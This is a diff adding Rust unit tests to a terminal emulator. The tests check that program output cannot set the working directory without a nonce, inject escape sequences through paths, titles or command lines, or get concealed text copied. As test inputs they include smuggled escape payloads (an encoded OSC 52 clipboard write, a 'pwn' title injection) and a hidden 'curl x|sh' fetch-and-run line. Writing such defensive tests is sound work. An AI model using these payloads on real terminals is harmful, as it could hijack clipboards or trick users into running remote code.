@@ -237,6 +237,32 @@ fn marks_without_the_nonce_are_ignored() {
 }
 
 #[test]
+fn output_cant_choose_the_directory_or_inject_escapes() {
+    let mut t = Term::new(40, 10);
+    t.set_mark_nonce("k3y");
+    t.feed(b"\x1b]7;file://host/home/me;nonce=k3y\x07");
+    // Without the nonce, a directory from output is ignored.
+    t.feed(b"\x1b]7;file://host/tmp/evil\x07");
+    assert_eq!(t.cwd(), Some("/home/me"));
+    // Control characters in a path are refused even with it.
+    t.feed(b"\x1b]7;file://host/tmp/%1b]52%3bc%3bZXZpbA%07;nonce=k3y\x07");
+    assert_eq!(t.cwd(), None);
+    // Titles and command lines lose control and bidi characters.
+    t.feed("\x1b]2;a\u{9b}31mb\u{202e}c\x07".as_bytes());
+    assert_eq!(t.title(), "a\u{FFFD}31mb\u{FFFD}c");
+    t.feed(b"\x1b]633;E;rm\\x1b]0\\x3bpwn\\x07;nonce=k3y\x07\x1b]133;C;nonce=k3y\x07");
+    assert_eq!(t.command_blocks().last().unwrap().command.as_deref(), Some("rm\u{FFFD}]0;pwn\u{FFFD}"));
+    t.feed(format!("\x1b]2;{}\x07", "x".repeat(5000)).as_bytes());
+    assert_eq!(t.title().chars().count(), 1024);
+}
+
+#[test]
+fn hidden_text_isnt_copied() {
+    let t = term(40, 2, "pip install foo\x1b[8m;curl x|sh\x1b[28m!");
+    assert_eq!(t.text_range((0, 0), (0, 39)).trim_end(), format!("pip install foo{}!", " ".repeat(";curl x|sh".len())));
+}
+
+#[test]
 fn options_set_scrollback_and_reported_colors() {
     let options = TermOptions { scrollback_lines: 2, foreground: (1, 2, 3), background: (0xaa, 0xbb, 0xcc) };
     let mut t = Term::with_options(5, 1, &options);
